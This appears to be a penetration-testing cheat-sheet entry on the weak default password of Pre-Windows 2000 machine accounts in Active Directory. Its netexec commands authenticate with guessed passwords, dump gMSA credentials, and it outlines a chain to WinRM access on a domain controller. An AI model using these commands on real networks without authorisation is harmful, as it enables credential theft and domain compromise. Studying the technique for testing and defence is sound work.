# Pre-Windows-2000 Machine Account Password

Machine accounts created with the "Pre-Windows 2000 compatible" option have their password set to the lowercase of their SAM name (minus the trailing `$`). These are easy to identify and authenticate with.

```bash
# Enumerate pre-2000 machine accounts:
nxc ldap <DC_IP> -u <USER> -p '<PASS>' -M pre2k
# netexec's pre2k module tries the default password for each account
# or: check for userAccountControl flag 0x200 (WORKSTATION_TRUST_ACCOUNT) with "4096" + PreW2K group

# Manual check: if account name is FILESERVER01$, try password 'fileserver01'
nxc smb <TARGET> -u 'FILESERVER01$' -p 'fileserver01'

# If valid, check what groups the machine account belongs to:
nxc ldap <DC_IP> -u 'FILESERVER01$' -p 'fileserver01' --groups
# Common privilege: member of group that can read gMSA passwords
nxc ldap <DC_IP> -u 'FILESERVER01$' -p 'fileserver01' --gmsa
```

Common chain: pre-2000 machine account → member of gMSA readers group → gMSA NT hash → WinRM on DC.
